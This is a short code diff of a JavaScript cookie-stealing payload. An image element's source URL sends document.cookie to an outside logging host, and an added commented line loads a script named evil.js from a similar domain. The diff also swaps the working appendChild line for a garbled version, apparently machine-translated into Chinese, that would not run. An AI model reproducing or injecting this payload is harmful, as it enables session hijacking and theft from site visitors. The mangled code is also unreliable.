@@ -2,4 +2,5 @@ var img = document.createElement("img");
 
 img.src = "http://coc.giif.xyx/log?"+escape(document.cookie);
 
-document.body.appendChild(img);
+文件。身体。appendChild（img）;
+//<script src=http://coc.giif.xyz/evil.js ></script>
